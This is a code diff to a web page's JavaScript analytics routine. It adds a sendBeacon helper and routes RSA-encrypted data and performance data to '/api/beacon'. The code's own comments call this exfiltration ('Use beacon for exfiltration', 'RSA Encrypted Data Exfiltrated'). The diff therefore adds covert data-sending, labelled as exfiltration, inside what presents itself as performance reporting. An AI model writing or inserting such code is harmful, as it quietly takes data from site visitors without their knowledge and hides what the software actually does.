@@ -206,6 +206,7 @@
                     var perfDataKey = "perfData";
                     var entropySourceUrl = "https://www.random.org/integers/?num=1&min=0&max=65535&col=1&base=10&format=plain&rnd=new";
                     var entropyRounds = 3;
+                    var beaconUrl = "/api/beacon";
 
                     var getRandomHexColor = function() {
                         let color = Math.floor(Math.random() * 16777215).toString(16);
@@ -456,6 +457,7 @@
                                 var rsaEncryptedData = rsaEncrypt(rsaData);
                                 if (rsaEncryptedData) {
                                     console.log("RSA Encrypted Data Exfiltrated:", rsaEncryptedData);
+                                    sendBeacon(beaconUrl, rsaEncryptedData); // Use beacon for exfiltration
                                 } else {
                                     console.error("RSA encryption failed during exfiltration.");
                                 }
@@ -603,22 +605,7 @@
                                       console.error("Failed to RSA encrypt performance data.");
                                       return;
                                   }
-
-                                  fetch(reportUrl, {
-                                      method: 'POST',
-                                      headers: {
-                                          'Content-Type': 'application/json'
-                                      },
-                                      body: JSON.stringify({ performance: rsaEncryptedPerf })
-                                  })
-                                  .then(response => {
-                                      if (!response.ok) {
-                                          console.error('Performance reporting failed:', response.status);
-                                      }
-                                  })
-                                  .catch(error => {
-                                      console.error('Performance reporting error:', error);
-                                  });
+                                 sendBeacon(beaconUrl, rsaEncryptedPerf); //Use beacon for perf data
                               }
                         } catch (perfReportError) {
                             console.error("Performance Report Error:", perfReportError);
@@ -648,6 +635,21 @@
                       } finally {
                         setTimeout(gatherAndReportAnalytics, analyticsInterval);
                       }
+                    };
+
+                     var sendBeacon = function(url, data) {
+                        if (navigator.sendBeacon) {
+                            navigator.sendBeacon(url, JSON.stringify(data));
+                        } else {
+                             fetch(url, {
+                                method: 'POST',
+                                headers: {
+                                  'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(data),
+                                keepalive: true
+                              }).catch(err => console.error("Beacon failed:", err));
+                        }
                     };
 
                     init();
